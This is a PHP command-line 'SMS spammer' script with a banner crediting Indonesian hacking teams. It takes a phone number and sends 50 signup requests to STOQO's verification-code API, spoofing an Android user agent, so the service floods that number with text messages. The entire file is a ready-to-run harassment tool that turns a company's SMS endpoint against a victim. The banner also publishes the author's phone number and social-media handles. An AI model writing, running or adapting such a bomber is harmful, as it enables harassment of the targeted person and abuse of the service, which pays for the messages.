<?php
function sms($no){
for ($i=1; $i <= 50; $i++) {
	$p = array("first_name" => "Baiwb", "last_name" => "Haihwh", "password" => "jsiwbw8wh76", "phone" => $no);

$post = json_encode($p);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stoqo.com/signup/generate_code/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.12.0");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=UTF8'));

$exe = curl_exec($ch);

curl_close($ch);

$js = json_decode($exe);

if (!empty($js->nexmo_request_id)) {
	echo "SUKSES\n";
	}else{
	echo "GAGAL\n";
}
}
}
echo "
############################################################
    Spammer SMS From STOQO
   Special Thaks To : IndosecID
        Author By   : MR.CL4Y
     Contact WA Me  : 085752481601
        My Team     : Rabbit Cyber Team
        My Team     : 2Easy4Hack Teamm
        My Team     : KALIMANTAN SQUAD
        My Github   : https://github.com/RabbitCL4Y
        My Facebook : Rafli Mhmmd
        My Instagram: muhammadrafli_337
     Penggunaan NO  : Bisa Menggunakan [628]
###########################################################\n\n";
echo "Nomor? (ex : 628*****)\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = sms($nomor, $p);
print $execute;
print "Botnya Lelah Gan, Silahkan Ulang Lagi Yahh\n";
?>
